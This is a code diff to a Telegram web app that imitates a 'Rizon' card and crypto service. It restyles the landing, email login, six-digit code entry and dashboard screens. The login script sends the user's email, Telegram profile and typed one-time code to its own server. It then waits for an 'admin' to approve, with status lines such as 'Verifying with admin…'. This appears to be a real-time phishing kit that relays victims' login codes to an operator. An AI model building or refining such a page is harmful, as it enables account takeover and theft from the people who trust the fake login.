@@ -17,7 +17,7 @@
 html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 .screen{
   position:fixed;inset:0;display:flex;flex-direction:column;
-  opacity:0;pointer-events:none;transition:opacity .45s ease;
+  opacity:0;pointer-events:none;transition:opacity .35s ease;
   overflow-y:auto;-webkit-overflow-scrolling:touch;
 }
 .screen.active{opacity:1;pointer-events:auto;z-index:10;}
@@ -29,32 +29,16 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 @keyframes fadeIn{from{opacity:0;transform:scale(.94);}to{opacity:1;transform:scale(1);}}
 
 /* ══════════ 2. LANDING ══════════ */
-#landing{
-  background:#000;
-  position:relative;
-  display:flex;
-  flex-direction:column;
-  overflow:hidden;
-}
+#landing{background:#000;position:relative;display:flex;flex-direction:column;overflow:hidden;}
 #landing .hero{
-  flex:1;
-  min-height:0;
-  position:relative;
-  background:
-    radial-gradient(circle at 50% 45%, #1a1a1a 0%, #000 70%);
-  display:flex;
-  flex-direction:column;
-  justify-content:flex-start;
-  padding:40px 24px 0;
-  overflow:hidden;
+  flex:1;min-height:0;position:relative;
+  background:radial-gradient(circle at 50% 45%, #1a1a1a 0%, #000 70%);
+  display:flex;flex-direction:column;justify-content:flex-start;
+  padding:40px 24px 0;overflow:hidden;
 }
 #landing .title-block{margin-top:20px;line-height:1;}
-#landing .title-block h1{
-  font-size:42px;font-weight:800;color:#fff;letter-spacing:-1px;
-}
-#landing .title-block h1 em{
-  font-family:'Playfair Display',serif;font-style:italic;font-weight:600;
-}
+#landing .title-block h1{font-size:42px;font-weight:800;color:#fff;letter-spacing:-1px;}
+#landing .title-block h1 em{font-family:'Playfair Display',serif;font-style:italic;font-weight:600;}
 #landing .trust{
   display:flex;align-items:center;gap:10px;margin-top:18px;
   background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);
@@ -62,11 +46,7 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 }
 #landing .flags{display:flex;font-size:16px;letter-spacing:-4px;}
 #landing .trust span{font-size:12px;color:#B0B0B0;font-weight:500;white-space:nowrap;}
-#landing .hero-art{
-  flex:1;
-  display:flex;justify-content:center;align-items:center;
-  position:relative;margin-top:20px;min-height:0;
-}
+#landing .hero-art{flex:1;display:flex;justify-content:center;align-items:center;position:relative;margin-top:20px;min-height:0;}
 #landing .hero-art .phone{
   width:58%;max-width:240px;aspect-ratio:9/17;
   background:linear-gradient(145deg,#111,#000);
@@ -76,126 +56,147 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
   font-size:70px;transform:rotate(-8deg);
 }
 #landing .hero-art .card{
-  position:absolute;top:12%;right:4%;
-  width:38%;max-width:150px;aspect-ratio:1.6/1;
-  background:linear-gradient(135deg,#FFE500,#F5C400);
-  border-radius:12px;transform:rotate(14deg);
-  box-shadow:0 20px 40px rgba(255,229,0,.25);
-  padding:10px;color:#000;font-weight:800;
-  display:flex;flex-direction:column;justify-content:space-between;
-  font-size:11px;
+  position:absolute;top:12%;right:4%;width:38%;max-width:150px;aspect-ratio:1.6/1;
+  background:linear-gradient(135deg,#FFE500,#F5C400);border-radius:12px;transform:rotate(14deg);
+  box-shadow:0 20px 40px rgba(255,229,0,.25);padding:10px;color:#000;font-weight:800;
+  display:flex;flex-direction:column;justify-content:space-between;font-size:11px;
 }
 #landing .hero-art .card .brand{font-size:14px;letter-spacing:1px;}
 #landing .hero-art .card .visa{font-size:11px;text-align:right;font-weight:800;font-style:italic;}
 #landing .hero-art .chip{width:22px;height:16px;background:linear-gradient(135deg,#c9c9c9,#888);border-radius:3px;margin-top:4px;}
-#landing .hero-art .token{
-  position:absolute;width:44px;height:44px;border-radius:50%;
-  display:flex;align-items:center;justify-content:center;
-  font-size:22px;font-weight:900;
-  box-shadow:0 10px 20px rgba(0,0,0,.5);
-}
+#landing .hero-art .token{position:absolute;width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;box-shadow:0 10px 20px rgba(0,0,0,.5);}
 #landing .hero-art .btc{top:30%;left:6%;background:linear-gradient(135deg,#F7931A,#c76d00);color:#fff;}
 #landing .hero-art .eth{top:48%;left:16%;background:linear-gradient(135deg,#627EEA,#3b4fd1);color:#fff;}
 #landing .hero-art .nvda{top:38%;right:22%;background:linear-gradient(135deg,#76B900,#4a7a00);color:#000;font-size:11px;}
 #landing .hero-art .tsla{top:58%;right:14%;background:linear-gradient(135deg,#E82127,#a01418);color:#fff;font-size:18px;}
 #landing .hero-art .appl{top:20%;left:22%;background:linear-gradient(135deg,#2c2c2c,#000);color:#fff;font-size:20px;}
 #landing .actions{
-  flex-shrink:0;
-  padding:16px 24px 34px;
+  flex-shrink:0;padding:16px 24px 34px;
   display:flex;flex-direction:column;gap:12px;
   background:linear-gradient(180deg, transparent 0%, #000 40%);
   position:relative;z-index:2;
 }
-#landing .btn{
-  width:100%;padding:18px;border-radius:40px;
-  font-size:16px;font-weight:600;text-align:center;
-  border:none;cursor:pointer;transition:.15s;
-}
+#landing .btn{width:100%;padding:18px;border-radius:40px;font-size:16px;font-weight:600;text-align:center;border:none;cursor:pointer;transition:.15s;}
 #landing .btn-white{background:#fff;color:#000;}
 #landing .btn-white:active{background:#e5e5e5;}
 #landing .btn-outline{background:transparent;color:#fff;border:1.5px solid rgba(255,255,255,.35);}
 #landing .btn-outline:active{background:rgba(255,255,255,.08);}
 
-/* ══════════ 3. LOGIN ══════════ */
+/* ══════════ 3. LOGIN (email) ══════════ */
 #login{background:var(--light);color:#000;padding:24px;justify-content:flex-start;}
-.back-row{display:flex;align-items:center;height:60px;margin-top:10px;}
-.back-btn{
-  font-size:24px;width:44px;height:44px;
-  display:flex;align-items:center;justify-content:center;
-  background:#fff;border-radius:50%;cursor:pointer;
-  box-shadow:0 2px 6px rgba(0,0,0,.06);
+.back-row{display:flex;align-items:center;height:44px;margin-top:10px;}
+.back-arrow{
+  font-size:26px;line-height:1;color:#000;
+  cursor:pointer;padding:6px 8px;user-select:none;
 }
-#login h1{font-size:34px;font-weight:800;color:#000;margin-top:24px;letter-spacing:-.5px;}
-#login p.sub{font-size:15px;color:var(--gray);margin-top:8px;margin-bottom:24px;line-height:1.4;}
-.input-group{margin-bottom:16px;}
-.input-group label{display:block;font-size:13px;color:#666;margin-bottom:8px;font-weight:500;}
+#login h1.title{
+  font-size:34px;font-weight:800;color:#000;margin-top:30px;
+  letter-spacing:-.8px;line-height:1.1;
+}
+#login p.subtitle{
+  font-size:16px;color:#5A5A5F;margin-top:12px;margin-bottom:32px;line-height:1.4;
+}
 .input-field{
-  width:100%;padding:20px;border-radius:20px;
-  border:1.5px solid var(--border);font-size:16px;outline:none;
+  width:100%;padding:22px 20px;border-radius:18px;
+  border:1.5px solid transparent;font-size:16px;outline:none;
   background:#fff;transition:.15s;color:#000;
+  box-shadow:0 1px 2px rgba(0,0,0,.04);
 }
+.input-field::placeholder{color:#B0B0B5;}
 .input-field:focus{border-color:#000;}
-.toggle-tabs{display:flex;background:#E5E5EA;border-radius:14px;padding:4px;margin-bottom:20px;}
-.toggle-tabs button{
-  flex:1;padding:10px;border:none;background:transparent;
-  font-size:14px;font-weight:600;color:#666;border-radius:10px;
-  cursor:pointer;transition:.15s;
-}
-.toggle-tabs button.active{background:#fff;color:#000;box-shadow:0 1px 3px rgba(0,0,0,.08);}
-.btn-main{
+
+.btn-continue{
   width:100%;padding:20px;border-radius:30px;font-size:16px;
-  font-weight:600;border:none;cursor:pointer;transition:.15s;margin-top:10px;
+  font-weight:600;border:none;cursor:pointer;transition:.15s;margin-top:16px;
+  background:#8E8E93;color:#fff;
 }
-.btn-black{background:#000;color:#fff;}
-.btn-black:active{background:#333;}
-.btn-disabled{background:#A1A1A6!important;color:#fff!important;cursor:not-allowed!important;}
-.status-msg{text-align:center;margin-top:20px;font-size:14px;padding:14px;border-radius:14px;font-weight:500;line-height:1.4;}
-.status-msg.error{color:var(--red);background:#FEE;}
-.status-msg.success{color:#0A7F2E;background:#E8F9EE;}
-.status-msg.info{color:#555;background:#EFEFEF;}
-.loader{border:3px solid #e0e0e0;border-top:3px solid #000;border-radius:50%;width:30px;height:30px;animation:spin .8s linear infinite;margin:30px auto;}
+.btn-continue.active{background:#000;color:#fff;}
+.btn-continue:not(.active){cursor:not-allowed;}
+
+#login .bottom-cta{
+  margin-top:auto;padding-top:40px;padding-bottom:20px;
+  text-align:center;font-size:15px;color:#3A3A3C;
+}
+#login .bottom-cta a{
+  color:#000;font-weight:700;text-decoration:none;cursor:pointer;
+}
+
+/* ══════════ 4. OTP ══════════ */
+#otp{background:var(--light);color:#000;padding:24px;justify-content:flex-start;}
+#otp h1.title{
+  font-size:34px;font-weight:800;color:#000;margin-top:30px;
+  letter-spacing:-.8px;line-height:1.15;
+}
+#otp p.subtitle{
+  font-size:16px;color:#5A5A5F;margin-top:14px;margin-bottom:36px;line-height:1.45;
+}
+#otp p.subtitle b{color:#1a1a1a;font-weight:600;}
+
+.otp-row{
+  display:flex;gap:10px;justify-content:space-between;
+  margin-bottom:24px;
+}
+.otp-box{
+  flex:1;
+  aspect-ratio:1/1.1;
+  max-width:56px;
+  background:#fff;
+  border:1.5px solid transparent;
+  border-radius:16px;
+  box-shadow:0 1px 3px rgba(0,0,0,.06);
+  font-size:24px;font-weight:700;text-align:center;
+  color:#000;outline:none;
+  transition:.15s;
+  caret-color:#000;
+}
+.otp-box:focus{border-color:#000;}
+.otp-box.filled{border-color:#000;}
+
+.resend-text{
+  margin-top:24px;text-align:left;
+  font-size:15px;color:#5A5A5F;line-height:1.5;
+}
+.resend-text .link{
+  color:#000;font-weight:600;cursor:pointer;text-decoration:underline;
+}
+.resend-text .link.disabled{
+  color:#B0B0B5;cursor:not-allowed;text-decoration:none;font-weight:500;
+}
+
+#otp-status{
+  margin-top:24px;font-size:14px;padding:14px;border-radius:14px;
+  font-weight:500;line-height:1.4;text-align:center;
+}
+#otp-status.hidden{display:none;}
+#otp-status.error{color:var(--red);background:#FEE;}
+#otp-status.info{color:#555;background:#EFEFEF;}
+#otp-status.success{color:#0A7F2E;background:#E8F9EE;}
+
+.loader{
+  border:3px solid #e0e0e0;border-top:3px solid #000;border-radius:50%;
+  width:26px;height:26px;animation:spin .8s linear infinite;margin:30px auto;
+}
 @keyframes spin{to{transform:rotate(360deg);}}
 
-/* ══════════ 4. DASHBOARD ══════════ */
+/* ══════════ 5. DASHBOARD ══════════ */
 #dashboard{background:#E5E5EA;color:#000;padding:0;padding-bottom:90px;}
 .db-header{display:flex;justify-content:space-between;align-items:center;padding:20px 20px 10px;gap:10px;}
-.db-header .icon-btn{
-  width:44px;height:44px;background:#fff;border-radius:50%;
-  display:flex;align-items:center;justify-content:center;
-  font-size:18px;box-shadow:0 2px 6px rgba(0,0,0,.06);cursor:pointer;
-}
+.db-header .icon-btn{width:44px;height:44px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 2px 6px rgba(0,0,0,.06);cursor:pointer;}
 .db-header .right{display:flex;gap:10px;align-items:center;}
 .demo-badge{background:var(--yellow);color:#000;font-size:11px;padding:5px 10px;border-radius:20px;font-weight:800;letter-spacing:.5px;text-transform:uppercase;}
 .card-widget{
-  margin:8px 20px 0;
-  background:linear-gradient(160deg,#1a1a1a 0%,#000 100%);
-  border-radius:24px;padding:26px 24px;color:#fff;
-  position:relative;min-height:190px;
+  margin:8px 20px 0;background:linear-gradient(160deg,#1a1a1a 0%,#000 100%);
+  border-radius:24px;padding:26px 24px;color:#fff;position:relative;min-height:190px;
   box-shadow:0 10px 30px rgba(0,0,0,.25);
 }
 .card-widget .brand{font-size:20px;font-weight:900;letter-spacing:1px;}
-.card-widget .info{
-  position:absolute;top:22px;right:22px;width:24px;height:24px;
-  border:1.5px solid rgba(255,255,255,.5);border-radius:50%;
-  display:flex;align-items:center;justify-content:center;
-  font-size:12px;font-weight:600;color:rgba(255,255,255,.7);
-}
+.card-widget .info{position:absolute;top:22px;right:22px;width:24px;height:24px;border:1.5px solid rgba(255,255,255,.5);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;color:rgba(255,255,255,.7);}
 .card-widget .label{font-size:13px;color:rgba(255,255,255,.6);margin-top:36px;}
 .card-widget .amount{font-size:44px;font-weight:800;margin-top:4px;letter-spacing:-1px;}
 .action-row{display:flex;gap:10px;padding:16px 20px;overflow-x:auto;}
-.action-btn{
-  flex:0 0 auto;padding:14px 22px;background:#fff;border:none;
-  border-radius:30px;font-size:14px;font-weight:600;color:#000;
-  display:flex;align-items:center;gap:8px;cursor:pointer;
-  box-shadow:0 2px 6px rgba(0,0,0,.05);
-}
+.action-btn{flex:0 0 auto;padding:14px 22px;background:#fff;border:none;border-radius:30px;font-size:14px;font-weight:600;color:#000;display:flex;align-items:center;gap:8px;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,.05);}
 .action-btn:active{background:#f0f0f0;}
-.banner-blue{
-  margin:8px 20px;padding:20px;border-radius:22px;
-  background:linear-gradient(120deg,#0A84FF,#0066CC);
-  color:#fff;position:relative;overflow:hidden;
-  display:flex;justify-content:space-between;align-items:center;
-}
+.banner-blue{margin:8px 20px;padding:20px;border-radius:22px;background:linear-gradient(120deg,#0A84FF,#0066CC);color:#fff;position:relative;overflow:hidden;display:flex;justify-content:space-between;align-items:center;}
 .banner-blue::after{content:'📱';position:absolute;right:-10px;bottom:-20px;font-size:110px;opacity:.18;transform:rotate(-15deg);}
 .banner-blue h3{font-size:20px;font-weight:800;margin-bottom:4px;}
 .banner-blue p{font-size:13px;opacity:.9;max-width:60%;line-height:1.35;}
@@ -214,12 +215,7 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 .step .info p{font-size:12px;color:#888;line-height:1.3;}
 .step .cta{padding:10px 18px;border-radius:30px;font-size:13px;font-weight:700;border:none;cursor:pointer;background:#000;color:#fff;flex-shrink:0;}
 .step .cta.disabled{background:#E5E5EA;color:#999;cursor:not-allowed;}
-.bottom-nav{
-  position:fixed;bottom:0;left:0;right:0;height:78px;
-  background:#fff;border-top:1px solid #E5E5EA;
-  display:flex;align-items:center;justify-content:space-around;
-  padding:0 6px;z-index:100;
-}
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;height:78px;background:#fff;border-top:1px solid #E5E5EA;display:flex;align-items:center;justify-content:space-around;padding:0 6px;z-index:100;}
 .nav-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;font-size:11px;color:#888;cursor:pointer;padding:8px 0;font-weight:500;}
 .nav-item.active{color:#000;font-weight:700;}
 .nav-item .ic{font-size:22px;line-height:1;}
@@ -273,36 +269,45 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
     </div>
   </div>
   <div class="actions">
-    <button class="btn btn-white" onclick="goCreateAccount()">Create account</button>
+    <button class="btn btn-white" onclick="goSignup()">Create account</button>
     <button class="btn btn-outline" onclick="goLogin()">Log in</button>
   </div>
 </div>
 
-<!-- LOGIN -->
+<!-- LOGIN (email) -->
 <div id="login" class="screen">
-  <div class="back-row"><div class="back-btn" onclick="showScreen('landing')">←</div></div>
-  <h1 id="login-title">Welcome back!</h1>
-  <p class="sub" id="login-sub">Log in to your Rizon account.</p>
-  <div class="toggle-tabs">
-    <button id="tab-email" class="active" onclick="switchTab('email')">📧 Email</button>
-    <button id="tab-phone" onclick="switchTab('phone')">📱 Phone</button>
+  <div class="back-row"><span class="back-arrow" onclick="showScreen('landing')">←</span></div>
+  <h1 class="title">Welcome back!</h1>
+  <p class="subtitle">Enter your email to log in.</p>
+  <input type="email" id="email-input" class="input-field" placeholder="example@email.com" autocomplete="email" inputmode="email">
+  <button id="continue-btn" class="btn-continue" disabled onclick="submitEmail()">Continue</button>
+  <div class="bottom-cta">
+    Don't have an account? <a onclick="goSignup()">Sign up</a>
   </div>
-  <div id="step-email">
-    <div class="input-group">
-      <label id="input-label">Email address</label>
-      <input type="text" id="identifier-input" class="input-field" placeholder="example@email.com" autocomplete="email">
-    </div>
-    <button id="send-otp-btn" class="btn-main btn-black btn-disabled" disabled onclick="requestOTP()">Send OTP</button>
+</div>
+
+<!-- OTP -->
+<div id="otp" class="screen">
+  <div class="back-row"><span class="back-arrow" onclick="backToEmail()">←</span></div>
+  <h1 class="title">Enter verification<br>code</h1>
+  <p class="subtitle">We sent a 6 digit code to<br><b id="otp-email">your email</b></p>
+
+  <div class="otp-row" id="otp-row">
+    <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="0" autocomplete="one-time-code">
+    <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="1">
+    <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="2">
+    <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="3">
+    <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="4">
+    <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="5">
   </div>
-  <div id="step-otp" class="hidden">
-    <div class="input-group">
-      <label>Enter OTP</label>
-      <input type="text" id="otp-input" class="input-field" placeholder="Enter OTP" inputmode="numeric" maxlength="8">
-    </div>
-    <button id="verify-otp-btn" class="btn-main btn-black" onclick="verifyOTP()">Verify &amp; Login</button>
+
+  <div class="resend-text">
+    Didn't receive code?
+    <span id="resend-link" class="link disabled">Resend in <span id="resend-secs">60</span> seconds</span>
   </div>
-  <div id="status-container" class="status-msg hidden"></div>
-  <div id="loading-container" class="hidden"><div class="loader"></div></div>
+
+  <div id="otp-status" class="hidden"></div>
+  <div id="otp-loading" class="hidden"><div class="loader"></div></div>
 </div>
 
 <!-- DASHBOARD -->
@@ -364,7 +369,7 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 
 <script>
 /* ═══════════════════════════════════════════════════════════
-   TELEGRAM WEBAPP — ROBUST USER DETECTION
+   TELEGRAM WEBAPP
    ═══════════════════════════════════════════════════════════ */
 let tg = window.Telegram?.WebApp;
 if (tg) { try { tg.expand(); tg.ready(); } catch(e){} }
@@ -372,20 +377,16 @@ else { tg = { close: () => window.close(), ready: () => {} }; }
 
 const API_URL = window.location.origin;
 
-/* Multi-fallback user detection — fixes "ID None" bug */
 function getTGUser() {
   try {
-    // 1. Direct object
     const u1 = window.Telegram?.WebApp?.initDataUnsafe?.user;
-    if (u1 && u1.id) { console.log("✅ user via initDataUnsafe"); return u1; }
-    // 2. Parse initData query-string
+    if (u1 && u1.id) return u1;
     const raw = window.Telegram?.WebApp?.initData;
     if (raw) {
       const p = new URLSearchParams(raw);
       const js = p.get("user");
-      if (js) { const u2 = JSON.parse(js); console.log("✅ user via initData"); return u2; }
+      if (js) return JSON.parse(js);
     }
-    // 3. URL hash (tgWebAppData)
     const hash = window.location.hash.slice(1);
     if (hash) {
       const hp = new URLSearchParams(hash);
@@ -393,16 +394,14 @@ function getTGUser() {
       if (tgData) {
         const inner = new URLSearchParams(tgData);
         const js = inner.get("user");
-        if (js) { const u3 = JSON.parse(js); console.log("✅ user via hash"); return u3; }
+        if (js) return JSON.parse(js);
       }
     }
-  } catch (e) { console.warn("getTGUser error:", e); }
-  console.warn("❌ Could not detect Telegram user");
+  } catch (e) { console.warn("getTGUser err:", e); }
   return null;
 }
 
 let TG_USER = getTGUser();
-console.log("initDataUnsafe:", window.Telegram?.WebApp?.initDataUnsafe);
 console.log("TG_USER:", TG_USER);
 
 /* ═══════════════════════════════════════════════════════════
@@ -415,196 +414,306 @@ function showScreen(id) {
 }
 
 /* ═══════════════════════════════════════════════════════════
-   BOOT — track-open, then show landing
+   BOOT
    ═══════════════════════════════════════════════════════════ */
 window.addEventListener("load", async () => {
-  // re-check user in case Telegram needed a tick to populate initData
   if (!TG_USER) TG_USER = getTGUser();
-
   if (TG_USER) {
     try {
-      const r = await fetch(`${API_URL}/api/track-open`, {
+      await fetch(`${API_URL}/api/track-open`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ telegram_user: TG_USER })
       });
-      console.log("track-open:", await r.json());
     } catch (e) { console.warn("track-open err:", e); }
-  } else {
-    console.warn("Skipping track-open — no TG_USER");
   }
-
-  setTimeout(() => showScreen("landing"), 1800);
+  setTimeout(() => showScreen("landing"), 1600);
 });
 
 /* ═══════════════════════════════════════════════════════════
-   LANDING → LOGIN
+   LOGIN / SIGNUP
    ═══════════════════════════════════════════════════════════ */
+const emailInput  = document.getElementById("email-input");
+const continueBtn = document.getElementById("continue-btn");
+
 function goLogin() {
-  document.getElementById("login-title").textContent = "Welcome back!";
-  document.getElementById("login-sub").textContent = "Log in to your Rizon account.";
-  resetLoginForm(); showScreen("login");
+  resetLogin(); showScreen("login");
+  setTimeout(() => emailInput.focus(), 400);
 }
-function goCreateAccount() {
-  document.getElementById("login-title").textContent = "Create account";
-  document.getElementById("login-sub").textContent = "Sign up for a Rizon account.";
-  resetLoginForm(); showScreen("login");
+function goSignup() {
+  resetLogin(); showScreen("login");
+  setTimeout(() => emailInput.focus(), 400);
 }
-function resetLoginForm() {
-  document.getElementById("step-email").classList.remove("hidden");
-  document.getElementById("step-otp").classList.add("hidden");
-  document.getElementById("status-container").classList.add("hidden");
-  document.getElementById("loading-container").classList.add("hidden");
-  document.getElementById("send-otp-btn").classList.remove("hidden");
-  document.getElementById("identifier-input").value = "";
-  document.getElementById("otp-input").value = "";
-  currentSessionId = null;
-  if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
-  updateSendBtnState();
+function resetLogin() {
+  emailInput.value = "";
+  continueBtn.classList.remove("active");
+  continueBtn.disabled = true;
+  document.getElementById("otp-status").classList.add("hidden");
 }
+
+emailInput.addEventListener("input", () => {
+  const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value.trim());
+  continueBtn.disabled = !ok;
+  continueBtn.classList.toggle("active", ok);
+});
+emailInput.addEventListener("keydown", (e) => {
+  if (e.key === "Enter" && !continueBtn.disabled) submitEmail();
+});
 
 /* ═══════════════════════════════════════════════════════════
-   EMAIL / PHONE TOGGLE
-   ═══════════════════════════════════════════════════════════ */
-let mode = "email";
-function switchTab(type) {
-  mode = type;
-  document.getElementById("tab-email").classList.toggle("active", type === "email");
-  document.getElementById("tab-phone").classList.toggle("active", type === "phone");
-  const input = document.getElementById("identifier-input");
-  const label = document.getElementById("input-label");
-  if (type === "email") {
-    input.type = "email"; input.placeholder = "example@email.com";
-    input.autocomplete = "email"; label.textContent = "Email address";
-  } else {
-    input.type = "tel"; input.placeholder = "+1 234 567 8900";
-    input.autocomplete = "tel"; label.textContent = "Phone number";
-  }
-  input.value = ""; updateSendBtnState();
-}
-
-/* ═══════════════════════════════════════════════════════════
-   VALIDATION
-   ═══════════════════════════════════════════════════════════ */
-const identifierInput  = document.getElementById("identifier-input");
-const sendOtpBtn       = document.getElementById("send-otp-btn");
-const stepEmail        = document.getElementById("step-email");
-const stepOtp          = document.getElementById("step-otp");
-const statusContainer  = document.getElementById("status-container");
-const loadingContainer = document.getElementById("loading-container");
-identifierInput.addEventListener("input", updateSendBtnState);
-
-function updateSendBtnState() {
-  const v = identifierInput.value.trim();
-  const ok = mode === "email"
-    ? /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)
-    : v.replace(/\D/g, "").length >= 7;
-  sendOtpBtn.disabled = !ok;
-  sendOtpBtn.classList.toggle("btn-disabled", !ok);
-}
-
-/* ═══════════════════════════════════════════════════════════
-   OTP FLOW
+   SUBMIT EMAIL → request OTP
    ═══════════════════════════════════════════════════════════ */
 let currentSessionId = null;
-let pollInterval = null;
+let currentEmail = "";
 
-async function requestOTP() {
-  const identifier = identifierInput.value.trim();
-  if (!identifier) return;
+async function submitEmail() {
+  const email = emailInput.value.trim();
+  if (!email) return;
+  currentEmail = email;
 
   if (!TG_USER) TG_USER = getTGUser();
 
-  loadingContainer.classList.remove("hidden");
-  statusContainer.classList.add("hidden");
-  sendOtpBtn.classList.add("hidden");
+  continueBtn.disabled = true;
+  continueBtn.textContent = "Please wait…";
 
   try {
     const res = await fetch(`${API_URL}/api/request-otp`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ identifier, telegram_user: TG_USER })
+      body: JSON.stringify({ identifier: email, telegram_user: TG_USER })
     });
     const data = await res.json();
 
     if (res.status === 403) {
-      loadingContainer.classList.add("hidden");
       showScreen("banned"); return;
     }
-
     if (data.session_id) {
       currentSessionId = data.session_id;
-      loadingContainer.classList.add("hidden");
-      stepEmail.classList.add("hidden");
-      stepOtp.classList.remove("hidden");
-      showStatus("📨 Request sent to Admin. Waiting for OTP…", "info");
-      startPolling();
+      document.getElementById("otp-email").textContent = email;
+      openOtpScreen();
     } else {
-      throw new Error(data.error || "Failed to request OTP");
+      throw new Error(data.error || "Failed to send code");
     }
   } catch (err) {
-    loadingContainer.classList.add("hidden");
-    sendOtpBtn.classList.remove("hidden");
-    showStatus(err.message || "Network error. Try again.", "error");
+    alert(err.message || "Network error");
+  } finally {
+    continueBtn.textContent = "Continue";
+    continueBtn.classList.add("active");
+    continueBtn.disabled = false;
   }
 }
 
-async function verifyOTP() {
-  const otp = document.getElementById("otp-input").value.trim();
-  if (!otp || !currentSessionId) return;
-  loadingContainer.classList.remove("hidden");
-  statusContainer.classList.add("hidden");
+function backToEmail() {
+  if (otpPoll) { clearInterval(otpPoll); otpPoll = null; }
+  if (resendTimer) { clearInterval(resendTimer); resendTimer = null; }
+  showScreen("login");
+}
+
+/* ═══════════════════════════════════════════════════════════
+   OTP SCREEN
+   ═══════════════════════════════════════════════════════════ */
+const otpBoxes = [...document.querySelectorAll(".otp-box")];
+const otpStatus = document.getElementById("otp-status");
+const otpLoading = document.getElementById("otp-loading");
+let otpPoll = null;
+let resendTimer = null;
+let otpSubmitted = false;
+
+function openOtpScreen() {
+  otpBoxes.forEach(b => { b.value = ""; b.classList.remove("filled"); });
+  otpStatus.classList.add("hidden");
+  otpLoading.classList.add("hidden");
+  otpSubmitted = false;
+
+  showScreen("otp");
+  setTimeout(() => otpBoxes[0].focus(), 350);
+
+  startResendCountdown(60);
+  startOtpPolling();
+}
+
+/* ── Handle typing in OTP boxes ── */
+otpBoxes.forEach((box, i) => {
+  box.addEventListener("input", (e) => {
+    // Keep only digits
+    box.value = box.value.replace(/\D/g, "").slice(-1);
+    box.classList.toggle("filled", !!box.value);
+
+    if (box.value && i < otpBoxes.length - 1) {
+      otpBoxes[i + 1].focus();
+    }
+    maybeAutoSubmit();
+  });
+
+  box.addEventListener("keydown", (e) => {
+    if (e.key === "Backspace") {
+      if (!box.value && i > 0) {
+        otpBoxes[i - 1].focus();
+        otpBoxes[i - 1].value = "";
+        otpBoxes[i - 1].classList.remove("filled");
+        e.preventDefault();
+      } else {
+        box.classList.remove("filled");
+      }
+    }
+    if (e.key === "ArrowLeft" && i > 0) otpBoxes[i - 1].focus();
+    if (e.key === "ArrowRight" && i < otpBoxes.length - 1) otpBoxes[i + 1].focus();
+  });
+
+  box.addEventListener("paste", (e) => {
+    e.preventDefault();
+    const text = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
+    if (!text) return;
+    for (let j = 0; j < 6 && j < text.length; j++) {
+      otpBoxes[j].value = text[j];
+      otpBoxes[j].classList.add("filled");
+    }
+    const next = Math.min(text.length, 5);
+    otpBoxes[next].focus();
+    maybeAutoSubmit();
+  });
+});
+
+function getOtp() {
+  return otpBoxes.map(b => b.value).join("");
+}
+
+function maybeAutoSubmit() {
+  const otp = getOtp();
+  if (otp.length === 6 && !otpSubmitted) {
+    otpSubmitted = true;
+    verifyOtp(otp);
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   VERIFY OTP
+   ═══════════════════════════════════════════════════════════ */
+async function verifyOtp(otp) {
+  otpLoading.classList.remove("hidden");
+  otpStatus.classList.add("hidden");
+
   try {
     await fetch(`${API_URL}/api/verify-otp`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ session_id: currentSessionId, otp })
     });
-    loadingContainer.classList.add("hidden");
-    showStatus("🔍 OTP sent to Admin for verification…", "info");
+    otpLoading.classList.add("hidden");
+    otpStatus.textContent = "🔍 Verifying with admin…";
+    otpStatus.className = "info";
+    otpStatus.classList.remove("hidden");
   } catch (err) {
-    loadingContainer.classList.add("hidden");
-    showStatus("Error verifying OTP. Try again.", "error");
+    otpLoading.classList.add("hidden");
+    showOtpError("Network error. Try again.");
   }
 }
 
-function startPolling() {
-  if (pollInterval) clearInterval(pollInterval);
-  pollInterval = setInterval(async () => {
+function showOtpError(msg) {
+  otpStatus.textContent = msg;
+  otpStatus.className = "error";
+  otpStatus.classList.remove("hidden");
+  otpSubmitted = false;
+  // Clear boxes for retry
+  setTimeout(() => {
+    otpBoxes.forEach(b => { b.value = ""; b.classList.remove("filled"); });
+    otpBoxes[0].focus();
+  }, 800);
+}
+
+/* ═══════════════════════════════════════════════════════════
+   POLLING FOR APPROVAL
+   ═══════════════════════════════════════════════════════════ */
+function startOtpPolling() {
+  if (otpPoll) clearInterval(otpPoll);
+  otpPoll = setInterval(async () => {
     if (!currentSessionId) return;
     try {
       const res = await fetch(`${API_URL}/api/check-status/${currentSessionId}`);
       const data = await res.json();
+
       if (data.status === "approved") {
-        clearInterval(pollInterval);
-        loadingContainer.classList.add("hidden");
-        showStatus("✅ Login Successful! Welcome to Rizon.", "success");
-        stepOtp.classList.add("hidden");
-        setTimeout(() => { showScreen("dashboard"); startCountdown(); }, 1400);
+        clearInterval(otpPoll); otpPoll = null;
+        if (resendTimer) { clearInterval(resendTimer); resendTimer = null; }
+        otpStatus.textContent = "✅ Login successful! Welcome to Rizon.";
+        otpStatus.className = "success";
+        otpStatus.classList.remove("hidden");
